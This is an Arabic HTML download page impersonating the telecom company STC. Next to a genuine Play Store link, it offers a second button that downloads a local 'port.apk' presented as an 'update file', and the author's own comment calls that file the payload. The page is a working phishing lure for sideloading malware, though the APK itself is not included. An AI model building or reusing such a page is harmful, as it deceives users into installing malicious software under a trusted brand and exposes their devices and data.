<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>تحميل تطبيق STC</title>
<style>
  body {
    margin: 0; 
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #f5f5f7;
    display: flex; 
    justify-content: center; 
    align-items: center; 
    height: 100vh;
  }
  .container {
    background: white;
    padding: 30px 40px;
    border-radius: 12px;
    box-shadow: 0 5px 15px rgb(0 0 0 / 0.1);
    max-width: 360px;
    width: 90%;
    text-align: center;
  }
  .logo {
    margin-bottom: 20px;
  }
  .logo img {
    max-width: 150px;
  }
  h1 {
    color: #d92027; /* STC red */
    margin-bottom: 25px;
  }
  .btn {
    display: block;
    background-color: #d92027;
    color: white;
    padding: 14px;
    border: none;
    border-radius: 8px;
    font-weight: 600;
    font-size: 18px;
    margin-bottom: 15px;
    cursor: pointer;
    text-decoration: none;
    user-select: none;
  }
  .btn:hover {
    background-color: #b21a21;
  }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <!-- صورة الشعار من نفس المجلد -->
      <img src="stc_logo.png" alt="STC Logo" />
    </div>
    <h1>تحميل تطبيق STC</h1>
    <!-- زر تحميل التطبيق الرسمي -->
    <a href="https://play.google.com/store/apps/details?id=com.stc" target="_blank" rel="noopener" class="btn">
      تحميل التطبيق الرسمي
    </a>

    <!-- زر تحميل البايلود من نفس المجلد -->
    <a href="port.apk" download class="btn" style="background:#444;">
      تحميل ملف التحديث
    </a>
  </div>
</body>
</html>
